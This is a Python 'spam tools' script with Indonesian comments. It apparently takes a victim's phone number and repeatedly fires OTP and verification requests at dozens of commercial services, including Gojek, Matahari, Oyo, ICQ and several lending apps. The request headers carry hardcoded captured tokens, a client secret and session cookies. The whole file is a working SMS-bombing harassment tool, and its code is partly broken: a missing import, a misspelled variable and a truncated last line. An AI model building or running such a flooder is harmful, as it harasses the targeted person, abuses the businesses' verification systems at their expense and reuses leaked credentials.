

#                                         WARNING

#|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
#|                                                                                                               |
#|                PERHATIAN KALU KALIAN MAU MENGUBAH TOOLS INI KALIAN HARUS CARI TEXT                            |
#|             YANG BERTULISKAN BOLEH DI UBAH DAN KALIAN JANGAN MENGUBAH DI AREA YANG TIDAK BOLEH DI Diubah      |
#|                                                                                                               |
#|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

























#                              TIDAK BOLEH DI UBAH!!!!!!!!!!!!!!
    sys          # Untuk fungsi pada terminal, seperti autoketik() dan exit()
    import subprocess   # Installing python module within code / script (Tanpa requirements.txt)

    try: # Import Module
        import requests # Post, Get, & Put URL API
        import time     # Untuk informasi waktu
        import random   # Untuk random user
        import os       # Untuk "clear" terminal
        import urllib3  # HTTP client untuk Python
        import json     # Agar body requests dapat dilihat dengan cara di print
        import bs4      # Untuk variasi output
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
    finally:
        import requests # Post, Get, & Put URL API
        import urllib3  # HTTP client untuk Python
        from bs4 import BeautifulSoup as bs

    from urllib3.exceptions import *
    from bs4 import BeautifulSoup as bs
    from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

    # Inisialisasi Variasi Warna Output Terminal.
    hijau   =   "\033[1;92m"
    putih   =   "\033[1;97m"
    abu     =   "\033[1;90m"
    kuning  =   "\033[1;93m"
    ungu    =   "\033[1;95m"
    merah   =   "\033[1;91m"
    biru    =   "\033[1;96m"

    # Function ini berfungsi sebagai pengganti print(), agar lebih menarik saat terlihat di terminal.
    def autoketik(s):
        for c in s + "\n":
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.050)

    # Function ini berfungsi sebagai informasi waktu saat pengiriman spam berlangsung.
    def countdown(time_sec):
            mins, secs = divmod(time_sec,60)
            timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
            waktu = time.localtime()
            keterangan_jam = time.strftime("%H:%M:%S", waktu)
            keterangan_tanggal = time.strftime("%d",waktu)
            keterangan_bulan = time.strftime("%B",waktu)
            bulan_bulan = {
            "January"    : 'Januari',
            "February"   : "Februari",
            "March"      : "Maret",
            "April"      : "April",
            "May"        : "Mei",
            "June"       : "Juni",
            "July"       : "Juli",
            "August"     : "Agustus",
            "September"  : "September",
            "October"    : "Oktober",
            "November"   : "November",
            "December"   : "Desember"
            } # Mengubah keterangan bulan menjadi bahasa Indonesia.
            bulan = bulan_bulan.get(keterangan_bulan)

            keterangan_tahun = time.strftime("%Y",waktu)

            keterangan_hari = time.strftime("%A",waktu)
            hari_hari = {
            "Sunday"    : 'Minggu',
            "Monday"    : "Senin",
            "Tuesday"   : "Selasa",
            "Wednesday" : "Rabu",
            "Thursday"  : "Kamis",
            "Friday"    : "Jum'at",
            "Saturday"  : "Sabtu"
            } # mengubah menjadi b.indo
            hari = hari_hari.get(keterangan_hARI)
#             BOLEH DI Diubah
            print(f"{timeformat} | {biru}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {kuning}Waktu {keterangan_jam}",end='\r')
            time.sleep(1)
            time_sec -= 1

    def tanya(nomor):
        check_input = 0
        while check_input == 0:
            a = input(f"""{merah}Apakah Anda ingin mengulangi Spam Tools? y/t
    {putih}Input Anda: {hijau}""")
            if a == "y" or a == "Y":
                check_input = 1
                start(nomor,1)
                break
            elif a == "t" or a == "T":
                check_input = 1
                autoketik(f"{hijau}Berhasil Keluar Dari Tools")
                sys.exit()
                break
            else:
                print ("Masukkan Pilihan Dengan Benar")
                sys.exit
#                            TIDAK BOLEH DIRUBAH
    def jam(nomor):
            autoketik("waktunya spam")
            b       =   nomor[1:12]
            c       =   "62" + b
            rto     =   0
            RTO_flag = 0
            for _ in range(10): # Looping
                try:
                    Ktbs                                  =  requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{nomor}')
                    Klikwa_XXX                            =  requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Authorization':'Basic QjMzOkZSMzM='},data=json.dumps({"number":"+62"+b}))

                    Payfaz_XXX                            =  requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text


                    SecuredAPI                             =  requests.post(f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={nomor}", headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'})
                    Matahari                               =  requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":nomor,"mobile_country_code":"+62"}})).text

                    Battlefront                            =  requests.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code",headers={'user-agent':'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'},data={'mobile_no':b})

                    Pinjamindo                             =  requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%b)
                    Jumpstart                              =  requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+b},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"}))
                    Asani                                  =  requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+b,"email":"akuntesnuyul@gmail.com"}))

                    Depop_from30                           =  requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=json.dumps({"phone_number":nomor,"country_code":"ID"}), headers={"Host": "webapi.depop.com","accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36","Content-Type": "application/json","Accept-Encoding": "gzip, deflate, br", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})

                    Indo_from30                            =  requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+nomor, headers={"Host": "account-api-v1.klikindomaret.com","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","origin": "https://account.klikindomaret.com","referer": "https://account.klikindomaret.com/SMSVerification?nohp="+nomor+"&type=register","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
                    Wa2_from30                             =  requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data={"namaDepan":"Tahalu"+str(random.randrange(11,99999)),"emailNope":nomor,"password":"Indo"+str(random.randrange(111,999)),"konfirmasiPass":"Indo"+str(random.randrange(111,999))}, headers={"Host": "qtva.id","Connection": "keep-alive","Accept": "text/html, */*; q=0.01","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://qtva.id","Referer": "https://qtva.id/page/register/siswa","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}).text

                    # Grabtaxi_bisa_tapi_sedikit_lama        =  requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':nomor, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                    # Grab_bisa_tapi_sedikit_lama            =  requests.post('https://api.grab.com/grabid/v1/phone/otp',data={'method':'CALL','countryCode':'id','phoneNumber':nomor,'templateID':'pax_android_production'})
                    # Grabfood_fromcochyhung_tapi_lama_30xend=  requests.post(f'https://api-sms-v2.herokuapp.com/grab-food?phone={nomor}').text
                    # Tiki_fromcochyhung_tapi_lama         =  requests.post(f'https://api-sms-v2.herokuapp.com/tiki?phone={nomor}').text
                    # Nhaphang_fromcochyhung_tapi_lama     =  requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={nomor}').text
                    # Elines_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/elines?phone={nomor}').text
                    # Metavn_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/meta-vn?phone={nomor}').text
                    # Bachhoaxanh_fromcochyhung_tapi_lama  =  requests.post(f'https://api-sms-v2.herokuapp.com/bach-hoa-xanh?phone={nomor}').text
                    # Gojoy_fromcochyhung_tapi_lama        =  requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={nomor}').text
                    # Vntrip_fromcochyhung_tapi_lama       =  requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={nomor}').text
                    # Thegioididong_fromcochyhung_tapi_lama=  requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={nomor}').text

                    # Harus_gaada_angka_0                    =  requests.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=json.dumps({"ketik":0,"nomor":"0"+b}),headers={"content-type": "application/json; charset=UTF-8","content-length": "34","accept-encoding": "gzip","user-agent": "okhttp/3.8.0","accept-language": "in","x-ada-token": "","x-ada-appid": "800006","x-ada-os": "android","x-ada-channel": "default","x-ada-mediasource": "","x-ada-agency": "adtubeagency","x-ada-campaign": "AdakamiCampaign","x-ada-role": "1","x-ada-appversion": "1.7.0","x-ada-device": "","x-ada-model": "SM-G935FD","x-ada-os-ver": "7.1.1","x-ada-androidid": "a4341a2sa90a4d97","x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39","x-ada-afid": "1580054114839-7395423911531673296"}).text
                    Icq_300xend                            =  requests.post("https://u.icq.net/api/v14/rapi/auth/sendCode", data=json.dumps({"reqId": "64708-1593781791", "params": {"phone":c, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}),headers={"accept": "*/*", "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7", "content-type": "application/json", "origin": "http://web.icq.com", "referer": "http://web.icq.com/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                    Cairin_id_100xend                      =  requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha",data={"haveImageCode":"0","fileName":"6f8c3b90c845f09ff1bfe714a30aede8","phone":nomor,"imageCode":"","userImei":"","type":"registry"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"}).text
                    Cmsapi_mapclub_30xend                  =  requests.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":nomor},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                    Bukuwarung_wa_500xend                  =  requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko-web","sec-ch-ua-platform":"Android","origin":"https://tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
                    # Rupa_rupa_30xend                       =  requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
                    Beryllium_mapclub_30xend               =  requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text

                    # Kredinesia_kartuserba_jalan            =  requests.post("https://api.kartuserba.com/appserver/v1/login/verificationCode",headers={'user-agent':'okhttp/3.11.0','content-type':'application/json; charset=UTF-8','channel-key':'GOOGLEPLAY'},data='{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"%s"}'%b)
                    # Tokomanamana                          =  requests.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":nomor},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
                    # Dekoruma                              =  requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",data=json.dumps({"phoneNumber":c,"platform":"wa"}),headers={"content-type": "application/json","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                    # Indihome                              =  requests.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',data={ 'type':'hp','msisdn':nomor }).text
                    # Halodoc                               =  requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})).text
                    # AmmarGanz_OLX                         =  requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
                    # Dekoruma                              =  requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
                    # Blibli                                =  requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text

                    # Greetday                               =  requests.Session().post('https://seekmi.com/ajax/send-otp', data={ 'phone': nomor,'name': 'YutixCode' }, headers={ 'X-CSRF-TOKEN': bs(requests.Session().get('https://seekmi.com/register').text,'html.parser').findAll('meta')[27]['content'] })
                    # Jadgreward                             =  json.loads(requests.get(f"https://id.jagreward.com/member/verify-mobile/{b}").text)
                    Danacita                               =  json.loads(requests.get("https://api.danacita.co.id/users/send_otp/?mobile_phone="+nomor,headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text)
                    Kredito                                =  requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",'{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%(b),headers={"LPR-TIMESTAMP":"1603281035821","Accept-Language":"id-ID","LPR-BRAND":"Kredito","LPR-PLATFORM":"android","User-Agent":"okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android","Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks","LPR-SIGNATURE":"e15dbea8602409df32a2ed5a123dc244","Content-Type":"application/json; charset=UTF-8","Content-Length":"79"}).text
                    Maucash                                =  requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",headers={"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}).text
                    Gojek                                  =  requests.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":c, "signed_up_country": "ID"},headers={"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}).text
                    Harvestcake                            =  requests.post("https://harvestcakes.com/register",data={"phone":b},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                    Oyo                                    =  requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone":b,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}).text
                    # MI_metroindonesia_10xend               =  requests.post('http://access.metroindonesia.com/Member/sendpin',data={'phoneno':nomor}).text
                    Foa                                    =  requests.post('https://foreignadmits.com/api/register-otp-generate-student',data={'mobile':f'62{nomor[1:]}','countryCode':'+62'}).text
                    # Matchwatch                             =  requests.post('https://apiv2.jamtangan.com/validateuniqueid', files={'params':(None, nomor),'step':(None, '2'),'type':(None, 'sms')}).text
                    # Tokomanamana                           =  requests.post('https://tokomanamana.com/ma/auth/request_token_merchant/',data={'phone':nomor},headers={'Host': 'tokomanamana.com','Connection': 'keep-alive','Content-Length': '18','Accept': '*/*','Origin': 'https://tokomanamana.com','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Referer': 'https://tokomanamana.com/ma/register','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,en-US;q=0.8'})
                    # Harnic                                 =  requests.post('https://harnic.id:443/login/phone_auth_OTP', data={'phone':nomor})
                    Sayurbox_wa                            =  requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={"Host":"www.sayurbox.com","content-length":"289","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile 